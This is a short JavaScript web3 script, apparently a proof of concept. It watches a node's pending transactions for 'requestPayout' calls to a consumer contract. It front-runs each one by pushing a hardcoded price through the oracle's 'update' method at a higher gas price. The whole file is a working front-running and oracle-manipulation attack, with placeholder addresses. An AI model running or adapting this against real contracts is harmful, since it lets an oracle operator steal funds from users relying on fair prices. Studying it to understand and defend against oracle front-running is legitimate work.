const Web3 = require("web3")
const abiDecoder = require("abi-decoder")
const web3 = new Web3(new Web3.providers.WebsocketProvider(("ws://127.0.0.1:8546")))

const CONSUMER_ABI = require("../build/contracts/SynchronousConsumer.json").abi
const ORACLE_ABI = require("../build/contracts/SynchronousOracle.json").abi

const CONSUMER_CONTRACT_ADDRESS = "<CONSUMER_CONTRACT_ADDRESS_ALL_UPPER_CASE>"
const ORACLE_CONTRACT_ADDRESS = "<ORACLE_CONTRACT_ADDRESS_ALL_UPPER_CASE>"
const ORACLE_ADDRESS = "<ORACLE_ADDRESS_ALL_UPPER_CASE>"

abiDecoder.addABI(CONSUMER_ABI)
const oracleContract = new web3.eth.Contract(ORACLE_ABI, ORACLE_CONTRACT_ADDRESS)

web3.eth.subscribe("pendingTransactions")
  .on("data", async (transactionHash) => {
    const transaction =
      await web3.eth.getTransaction(transactionHash)
    if (isPending(transaction) &&
       isRelevantContract(transaction.to) &&
       isRelevantMethod(transaction.input)) {
      updatePrice(transaction.gasPrice) // front-run
    }
  })

const isPending = (transaction) =>
  transaction && transaction.blockNumber == null

const isRelevantContract = (toAddress) =>
  toAddress && toAddress.toUpperCase() === CONSUMER_CONTRACT_ADDRESS

const isRelevantMethod = (transactionInput) =>
  abiDecoder.decodeMethod(transactionInput).name === "requestPayout"

const updatePrice = (transactionGas) => {
  let frontPrice = parseInt(transactionGas) + Math.pow(10, 9)
  oracleContract.methods.update(getStockPrice())
    .send({ from: ORACLE_ADDRESS, gasPrice: frontPrice })
}

const getStockPrice = () => 11;

(function wait () {
  setTimeout(wait, 999999999)
})()
